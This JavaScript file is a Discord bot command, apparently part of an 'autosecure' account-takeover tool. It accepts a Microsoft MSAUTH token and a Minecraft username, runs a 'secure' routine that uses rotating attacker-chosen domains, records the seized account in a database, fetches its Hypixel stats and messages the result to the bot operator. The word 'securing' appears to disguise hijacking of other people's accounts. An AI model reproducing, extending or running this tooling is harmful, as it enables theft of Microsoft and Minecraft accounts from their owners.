const secure = require("../../../autosecure/utils/secure/recodesecure.js");
const listAccount = require("../../../autosecure/utils/accounts/listAccount.js");
const { queryParams } = require("../../../db/database.js");
const statsembed = require("../../../autosecure/utils/stats/statsembed.js");
const generateuid = require("../../../autosecure/utils/generateuid.js");
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const insertaccount = require('../../../db/insertaccount.js');
const getStats = require("../../../autosecure/utils/hypixelapi/getStats.js");
const mcregex = require("../../.././autosecure/utils/utils/mcregex.js");
const { failedembed } = require("../../../autosecure/utils/embeds/embedhandler.js");

module.exports = {
    name: "authsecure",
    userOnly: true,
    callback: async (client, interaction) => {

        const msauth = interaction.fields.getTextInputValue('msauth');
        const mcign = interaction.components[1].components[0].value || null;

        if (mcign && !mcregex(mcign)) {
            return interaction.reply({
                content: "Please enter a valid minecraft username!",
                ephemeral: true
            });
        }

        if (!msauth || msauth.length < 1) {
            return interaction.reply({ content: `Invalid MSAUTH`, ephemeral: true });
        }

        let settings = await client.queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
        if (settings.length === 0) {
            console.log(`Settings not found for user: ${interaction.user.id}. Automatically creating default settings.`);
            await client.queryParams("INSERT INTO secureconfig (user_id, domain) VALUES (?, ?)", [interaction.user.id, 'Rotate (4 Domains)']);
            settings = await client.queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
        }
        if (settings[0]?.domain && (settings[0].domain.includes('thapcamstore') || settings[0].domain.trim() === '')) {
            client.queryParams(`UPDATE secureconfig SET domain = ? WHERE user_id = ?`, ['Rotate (4 Domains)', interaction.user.id]).catch(() => {});
            settings[0].domain = 'Rotate (4 Domains)';
        }
        settings = settings[0];

        await interaction.deferReply({ ephemeral: true });

        const uid = await generateuid();

        const embed = {
            title: 'This account is being automatically secured.',
            color: 0x808080
        };

        const components = [
            new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId(`status|${uid}`)
                    .setLabel('⏳ Status')
                    .setStyle(ButtonStyle.Primary)
            )
        ];

        await interaction.editReply({ embeds: [embed], components });
        await interaction.user.send({ embeds: [embed], components });

        try {
            const acc = await secure(msauth, settings, uid, mcign);


                await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);


                    const failedmsg = await failedembed(acc, uid);
                    if (failedmsg.failed) {
                        await interaction.followUp(failedmsg.failedmsg);
                        await interaction.user.send(failedmsg.failedmsg);
                        return;
                    }

            const accountmessage = await listAccount(acc, uid, client, interaction);
            await interaction.user.send(accountmessage).catch(() => {});
            await interaction.editReply(accountmessage).catch(() => {});

        } catch (error) {
            console.error(error);

            await interaction.editReply({
                embeds: [{
                    title: `Error Securing Account`,
                    description: `An error occurred while securing your account.`,
                    color: 0xff0000
                }],
                ephemeral: true
            });
        }
    }
};
